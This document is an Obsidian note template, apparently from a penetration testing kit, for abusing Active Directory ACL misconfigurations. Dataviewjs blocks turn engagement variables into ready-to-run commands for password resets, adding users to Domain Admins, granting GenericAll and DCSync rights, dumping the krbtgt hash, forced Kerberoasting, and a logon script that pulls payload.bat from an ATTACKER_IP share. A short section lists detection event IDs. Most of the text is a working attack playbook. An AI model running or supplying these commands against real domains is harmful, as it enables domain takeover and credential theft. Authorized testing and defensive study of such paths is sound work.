---
# Attack-specific fields
acl_source_principal:
acl_target_object:
acl_right_found:
acl_attack_action: password_reset
acl_new_password:
notes:
---

# ACL / DACL Abuse

> [!abstract] Attack Summary
> Active Directory objects have **Discretionary Access Control Lists (DACLs)** that govern who can modify them. Misconfigured ACLs often allow low-privileged users to **reset passwords**, **modify group membership**, **write properties**, **grant rights to themselves**, or even **take ownership**. ACL chains (A→B→C→DA) are a primary BloodHound attack path.

---

## Baseline (from [[00 - Engagement Baseline]])

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
dv.table(["Field", "Value"], [
  ["Domain",   b?.domain   ?? "—"],
  ["DC IP",    b?.dc_ip    ?? "—"],
  ["Username", b?.username ?? "—"],
  ["OS Env",   b?.os_env   ?? "—"],
]);
```

---

## Attack-Specific Configuration

```dataviewjs
const p = dv.current();
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const actions = ["password_reset","group_add","writedacl","writeowner","dcsync_grant","spn_set","logonscript","object_owner"];
const actionOptions = actions.map(a => `option(${a})`).join(',');

dv.table(["Field", "Value"], [
  ["Source Principal (who you control)", `\`INPUT[text(defaultValue("${p.acl_source_principal || b?.username || ''}")):acl_source_principal]\``],
  ["Target Object (who has the right)", `\`INPUT[text:acl_target_object]\``],
  ["ACL Right Found",                   `\`INPUT[text:acl_right_found]\``],
  ["Attack Action",                     `\`INPUT[inlineSelect(defaultValue(${p.acl_attack_action ?? 'password_reset'}),${actionOptions}):acl_attack_action]\``],
  ["New Password (if resetting)",       `\`INPUT[text(defaultValue("${p.acl_new_password ?? 'NewPass123!'}")):acl_new_password]\``],
]);
```

---

## Step 1 — Enumerate ACL Misconfigurations

**Windows — PowerView (find interesting DACLs)**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const source = p?.acl_source_principal || b?.username || "USER";
dv.paragraph("```powershell\n# Find all objects where current user/group has interesting rights\nFind-InterestingDomainAcl -ResolveGUIDs | ?{ $_.IdentityReferenceName -match '" + source + "' } |\nSelect ObjectDN, ObjectAceType, ActiveDirectoryRights, IdentityReferenceName\n\n# Specific rights to look for:\n# GenericAll, GenericWrite, WriteOwner, WriteDACL,\n# ResetPassword, WriteProperty, Self, ExtendedRight\n\n# Get full ACL on specific object\nGet-ObjectAcl -SamAccountName 'TARGET_OBJECT' -ResolveGUIDs\n\n# Get ACL on a group\nGet-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs\n```");
```

**Windows — ADSearch (LDAP query for owned)**
```dataviewjs
dv.paragraph("```bash\nexecute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Release\\ADSearch.exe --search '(objectClass=user)' --attributes samaccountname,nTSecurityDescriptor\n```");
```

**Linux — BloodHound / dacledit**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const domain   = b?.domain   ?? "DOMAIN";
const dc_ip    = b?.dc_ip    ?? "DC_IP";
const username = b?.username ?? "USER";
const password = b?.password ?? "PASSWORD";
dv.paragraph("```bash\n# Read ACL on a specific object\nimpacket-dacledit " + domain + "/" + username + ":'" + password + "' -dc-ip " + dc_ip + " -target 'TARGET_OBJECT' -action read\n\n# Find objects where you have write rights\n# (Use BloodHound for comprehensive mapping)\n```");
```

Source: `INPUT[text:acl_source_principal]` | Target: `INPUT[text:acl_target_object]`
Right found: `INPUT[text:acl_right_found]`

---

## Attack A — Password Reset (ForceChangePassword / ResetPassword)

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain    = b?.domain   ?? "DOMAIN";
const dc_ip     = b?.dc_ip    ?? "DC_IP";
const target    = p?.acl_target_object || "TARGET_USER";
const newPass   = p?.acl_new_password  || "NewPass123!";
dv.paragraph("```powershell\n# Reset password without knowing old one\nSet-DomainUserPassword -Identity '" + target + "' -AccountPassword (ConvertTo-SecureString '" + newPass + "' -AsPlainText -Force)\n\n# Or via net rpc\nnet rpc password '" + target + "' '" + newPass + "' -U '" + domain + "/" + (b?.username ?? "USER") + "%" + (b?.password ?? "PASS") + "' -S " + dc_ip + "\n\n# Or Impacket\nimpacket-changepasswd " + domain + "/" + (b?.username ?? "USER") + ":'" + (b?.password ?? "PASS") + "'@" + dc_ip + " -newpass '" + newPass + "' -target-user " + target + "\n```");
```

---

## Attack B — Add User to Group (AddMember / GenericWrite on group)

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain    = b?.domain   ?? "DOMAIN";
const dc_ip     = b?.dc_ip    ?? "DC_IP";
const username  = b?.username ?? "USER";
const source    = p?.acl_source_principal || username;
const target    = p?.acl_target_object || "Domain Admins";
dv.paragraph("```powershell\n# Add user to a group you have write access on\nAdd-DomainGroupMember -Identity '" + target + "' -Members '" + source + "' -Verbose\n\n# Verify\nGet-DomainGroupMember -Identity '" + target + "'\n\n# Cleanup: remove after getting TGT\nRemove-DomainGroupMember -Identity '" + target + "' -Members '" + source + "'\n```");
```

**Linux**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain   = b?.domain   ?? "DOMAIN";
const dc_ip    = b?.dc_ip    ?? "DC_IP";
const username = b?.username ?? "USER";
const password = b?.password ?? "PASSWORD";
const source   = p?.acl_source_principal || username;
const target   = p?.acl_target_object || "Domain Admins";
dv.paragraph("```bash\nimpacket-dacledit " + domain + "/" + username + ":'" + password + "' -dc-ip " + dc_ip + " -target '" + target + "' -principal '" + source + "' -action write -rights WriteMembers\n\n# Or via net rpc group\nnet rpc group addmem '" + target + "' '" + source + "' -U '" + domain + "/" + username + "%" + password + "' -S " + dc_ip + "\n```");
```

---

## Attack C — WriteDACL (Grant Yourself Any Right)

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain   = b?.domain   ?? "DOMAIN";
const dc_ip    = b?.dc_ip    ?? "DC_IP";
const username = b?.username ?? "USER";
const password = b?.password ?? "PASSWORD";
const source   = p?.acl_source_principal || username;
const target   = p?.acl_target_object || "TARGET_OBJECT";
dv.paragraph("```powershell\n# WriteDACL: modify the target's ACL to grant yourself GenericAll\nAdd-DomainObjectAcl -TargetIdentity '" + target + "' -PrincipalIdentity '" + source + "' -Rights All\n\n# Then exploit with GenericAll rights\n```");
```

---

## Attack D — WriteOwner (Take Ownership, then WriteDACL)

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const source = p?.acl_source_principal || b?.username || "USER";
const target = p?.acl_target_object || "TARGET_OBJECT";
dv.paragraph("```powershell\n# Step 1: Set yourself as owner\nSet-DomainObjectOwner -Identity '" + target + "' -OwnerIdentity '" + source + "'\n\n# Step 2: Now you have implicit WriteDACL as owner — grant yourself GenericAll\nAdd-DomainObjectAcl -TargetIdentity '" + target + "' -PrincipalIdentity '" + source + "' -Rights All\n\n# Step 3: Exploit (reset password, add to group, etc.)\n```");
```

---

## Attack E — Grant DCSync Rights via WriteDACL on Domain

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain   = b?.domain ?? "DOMAIN";
const dc_ip    = b?.dc_ip  ?? "DC_IP";
const source   = p?.acl_source_principal || b?.username || "USER";
const username = b?.username ?? "USER";
const password = b?.password ?? "PASSWORD";
dv.paragraph("```powershell\n# Grant DCSync rights to your user on the domain object\nAdd-DomainObjectAcl -TargetIdentity '" + domain + "' -PrincipalIdentity '" + source + "' -Rights DCSync\n\n# Verify\nGet-ObjectAcl -DistinguishedName 'DC=" + domain.split('.').join(',DC=') + "' -ResolveGUIDs | ?{ $_.IdentityReference -match '" + source + "' }\n\n# Now DCSync\nimpacket-secretsdump " + domain + "/" + username + ":'" + password + "'@" + dc_ip + " -just-dc-user krbtgt\n```");
```

---

## Attack F — Set SPN for Kerberoasting (GenericWrite)

```dataviewjs
const p = dv.current();
const target = p?.acl_target_object || "TARGET_USER";
dv.paragraph("```powershell\n# Set a fake SPN on the user (makes them kerberoastable)\nSet-DomainObject -Identity '" + target + "' -Set @{ServicePrincipalName = 'fake/spn'}\n\n# Now kerberoast\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe kerberoast /user:" + target + " /nowrap\n\n# Cleanup after cracking\nSet-DomainObject -Identity '" + target + "' -Clear ServicePrincipalName\n```");
```

---

## Attack G — Logon Script via WriteProperty

```dataviewjs
const p = dv.current();
const target = p?.acl_target_object || "TARGET_USER";
dv.paragraph("```powershell\n# Set logon script that executes when target user logs in\nSet-DomainObject -Identity '" + target + "' -Set @{scriptPath = '\\\\ATTACKER_IP\\share\\payload.bat'}\n\n# When target logs in, script runs in their context\n# Capture NTLM or execute payload\n\n# Cleanup\nSet-DomainObject -Identity '" + target + "' -Clear scriptPath\n```");
```

---

## OPSEC

> [!warning] Detection Indicators
> - ACL modifications: **Event 5136** (directory service object modification) with attribute `nTSecurityDescriptor`.
> - Password resets: **Event 4723** (password change attempt) and **Event 4724** (password reset).
> - Group membership changes: **Event 4728** (member added to global security group).
> - DCSync right grants: **Event 5136** on domain object with replication GUIDs.
> - SPN modifications: **Event 4738** (user account changed) with SPN field.

---

## Notes & Results

`INPUT[textarea:notes]`
